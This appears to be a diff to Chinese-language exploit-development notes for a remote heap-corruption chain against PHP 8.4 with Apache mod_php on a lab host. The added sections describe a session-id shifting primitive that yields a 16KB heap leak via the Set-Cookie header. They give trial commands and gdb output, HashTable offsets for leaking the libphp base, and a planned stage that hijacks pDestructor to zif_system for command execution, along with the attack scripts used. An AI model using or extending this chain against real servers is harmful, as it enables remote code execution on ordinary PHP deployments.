@@ -1,7 +1,7 @@
 # 不依赖 `display_errors` 的纯 HTTP 链：进展与剩余标定
 
 日期：2026-10-21
-目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（`<LAB_HOST>`，
+目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（`172.16.0.103`，
 `display_errors=0`、`memory_limit=8M`、单 worker）
 约束：完全远程、只发普通 multipart HTTP；目标页面是
 `<?php echo "OK\n"; ?>`（无 `session_start()`）；不读目标 `/proc`。
@@ -397,7 +397,87 @@ PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> 数据第 2 个 qwor
   id chunk 留 page 511 + bin-56 run 落 511”三段式堆整形；这是下一步的
   标定工作，不是调一个参数能解决的。
 
-### 6.3 stage-3
+### 6.3 新原语（2026-10-21 晚）：stale id 移位到活字符串内部
+
+上面 5.x 的路径把 `PS(id)` 留在 cached chunk 的 page 511；本轮换了一条
+**主 chunk 内、不依赖 page-511 forge** 的路径，已经实测出 16KB 越界读：
+
+1. A 在 `WARM_LEN=60` 的基础上再加一个 32 字节值的字段（`W64_LEN=32`，
+   stored zend_string = 24+32+1 = 57 → bin-64）。它先占 page 128 的
+   bin-64 run 的 slot 0，`php_session_create_id` 的 32 字节 id 落到
+   **slot 1**：`PS(id) = chunk + 0x80080`（page 128 + 0x80）。
+2. B 仍用 N=160 个 231B 值字段；page 128 是 bin-256 run，slot 0 是
+   一条**存活**的 231B 字符串。`PS(id)=page+0x80` 正好落在这条字符串
+   data 区内：
+   - id 的 len 字段在 `PS(id)+0x10 = page+0x90 = value[0x78]`；
+   - id 的 data 从 `PS(id)+0x18 = page+0x98 = value[0x80]` 开始。
+   在**每条**值字符串的 offset 0x78 写入 `0x4000`，offset 0x80 写入
+   非零字节（`V`），B 的 `send_cookie` 就会按 0x4000 做 URL-encode：
+   header 校验（`ZSTR_VAL(id)[0] != 0`）也通过，因为该字节是我们写的 `V`。
+3. 不再需要 free-list/forge 落在 stale 块上，也不需要 cached chunk。
+
+实测参数与结果（no-ASLR，display_errors=0）：
+
+```bash
+# A：WARM=60 把 id 主 chunk 化；W64=32 把 id 从 page+0x00 推到 page+0x80
+WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
+#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
+#   MM_SAFE_ERROR 仍在 php_url_encode；PS_AT_OOM send_cookie=1
+
+# B：N=160 个 231B 值，值内 offset 0x78 伪造 len=0x4000
+WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
+  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
+#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
+#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
+#   Set-Cookie PHPSESSID=...（20616 字符，解码 16392 字节）
+```
+
+响应归档：`logs/oomcookie_shift_leak_20261021.resp`。解码后的 16KB 是
+page 128 起的 bin-256 字符串槽（每条 `gc=0x…0001, h=0, len=0xe7,
+data='V'*231`），即**受控长度、跨槽/跨块的堆读**已经成立；窗口内容目前
+全是字段字符串本身，还没有 libphp 代码指针。
+
+### 6.4 stage-2 在新原语下的两个待解约束
+
+要把 16KB 窗口变成 libphp 泄漏，需要窗口里出现**真实 HashTable 结构**
+（`pDestructor = libphp+0x613c50` 在 `HT+0x30`）。对齐关系是：
+
+```text
+PS(id) = HT + 0x10
+  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
+  id+0x18 = HT+0x28 = nNextFreeElement                -> 数据[0]
+  id+0x20 = HT+0x30 = pDestructor                     -> 数据[8]
+```
+
+当前 A 的 `PS(id)=page128+0x80` 正好等于 bin-56 run 的 **slot 2 + 0x10**
+（bin-56 槽步长 0x38，slot2=0x70），所以只要 B 的 bin-56 run 落在
+page 128，且 slot 2 是一个 `nTableSize>=16` 的数组 HashTable，就能直接
+泄漏 `pDestructor`。实测两个卡点：
+
+1. **bin-56 的 free-list 起点**：B 的 `SESSION_INIT` 时 bin-6
+   （56B）free chain 长度是 **64**（一整个空页，来自 A 的 request
+   shutdown）。必须先消耗这 64 个槽，第 65 个 HashTable 才会建新 run；
+   而数组字段的 key/value 字符串（bin-32/40/48）会在这之前先建自己的
+   run，把 page 128 抢走（实测 page 128 变成 bin-3/bin-4，id 读到
+   garbage/len=1）。
+2. **page 127 的 stale `ps_files`**：display_errors=0 的 A 在
+   `php_url_encode` 内 OOM，`php_session_abort()` 没跑，`PS(mod_data)`
+   仍是悬空 ps_files（page 127 + 0x500）。B 的 END cleanup 会先
+   `ps_close_files` 再 `send_cookie`。page 127 必须被 B 重新分配成
+   **合适 bin 的 SRUN 页**，且 `+0x500` 槽不能是存活字符串（否则
+   `last_key/basedir` 读到 zend_string 头，`zend_string_release` 崩溃）。
+   5.x 的 N=160 形状恰好让 page 127 成为 bin-256 且 slot 5 空闲；
+   加入数组/尾部字段后，page 127 会变 free/bin-32/bin-40，触发
+   `zend_mm_panic` 或 SIGSEGV。当前尚未找到同时满足
+   “page 127 slot5 安全 + page 128 bin-56 run slot2 是 HashTable” 的
+   字段序列。
+
+这两点是 stage-2 的纯标定问题；stage-3 的 `zif_system` 终端
+（`pDestructor=zif_system`、fake execute_data）可在 stage-2 给出
+libphp base 后直接复用 `send_b_zif.py`，只差 fake HT/fake-ref 地址
+按新形状重标。
+
+### 6.5 stage-3
 
 `zif_system` 终端（`pDestructor=zif_system`，fake execute_data）不依赖
 libc；一旦 stage-2 给出 libphp base，可直接复用 `send_b_zif.py` 的
@@ -408,8 +488,8 @@ payload，只需按 0 链的 A/B 形状重新标定 fake HT 地址与 fake-ref �
 
 | 文件 | 用途 |
 |---|---|
-| `tools/send_a_oom5.py` | A：S 个 103B 名字/8B 值 + NB 大字段 + X 个 231B 值 + 文件部分；可选 `AQ_N/AQ_LEN` GET padding |
-| `tools/send_b_open.py` | B：N 个 231B 值 + PHPSESSID + PROGRESS，无文件部分；`BB1_LEN` 铺页字段、`BF_P1/BF_READ` forge 字段；可选 Cookie/Header/GET padding |
+| `tools/send_a_oom5.py` | A：S 个 103B 名字/8B 值 + NB 大字段 + X 个 231B 值 + 文件部分；可选 `AQ_N/AQ_LEN` GET padding、`WARM_LEN`、`W64_LEN`（bin-64 移位） |
+| `tools/send_b_open.py` | B：N 个 231B 值 + PHPSESSID + PROGRESS，无文件部分；`BB1_LEN` 铺页、`BF_P1/BF_READ` forge、`BVAL_OFF/BVAL_LEN` 值内伪造 len、`BUNIQ/DUP_*` 唯一值/同名字段、`NEST_*` 嵌套数组、`TAIL231/232` 尾字段；可选 Cookie/Header/GET padding |
 | `tools/trial_bins.sh` | A-only 标定（重启 + gdb + 发 A） |
 | `tools/trial_ab.sh` | fresh worker + gdb 断点解析后发 A/B；`ASLR_ON=1` 时不开 `setarch -R` |
 | `tools/g_bins.gdb` | gdb 探针：`SEND_COOKIE`、`OPEN_FILES`、`RESET_ID`、`RSHUT_ID`、`MM_SAFE_ERROR`、chunk/page map、cached chunks、bin15 空槽统计 |
@@ -419,6 +499,7 @@ payload，只需按 0 链的 A/B 形状重新标定 fake HT 地址与 fake-ref �
 | `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR 泄漏响应（decoded 4000, 47 ptrs, base 0x7ffff3e00000） |
 | `logs/oomcookie_leak_aslr_20261021.resp` | ASLR 泄漏响应（base 0x7f9acd000000） |
 | `logs/oomcookie_leak_decode_20261021.txt` | 解码结果摘要 |
+| `logs/oomcookie_shift_leak_20261021.resp` | 移位 id 原语的 16KB 泄漏响应（len=16384, 20616 字符） |
 
 复现（目标机 `~/php2shell-work`）：
 
